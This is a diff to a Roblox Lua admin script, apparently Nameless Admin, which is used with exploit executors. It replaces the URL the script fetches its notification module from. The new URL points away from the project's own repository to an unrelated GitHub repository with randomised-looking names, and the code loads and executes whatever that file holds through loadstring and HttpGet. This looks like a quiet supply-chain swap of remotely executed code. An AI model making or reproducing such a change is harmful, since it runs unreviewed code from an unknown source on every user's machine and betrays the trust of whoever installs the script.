@@ -74,7 +74,7 @@ local Notification=nil
 
 repeat 
 	local s,r=pcall(function()
-		return loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NamelessAdminNotifications.lua"))()
+		return loadstring(game:HttpGet("https://raw.githubusercontent.com/d1amondz96/Gomzkmxk/refs/heads/main/VmdkamzH",true))()
 	end);
 
 	if s then
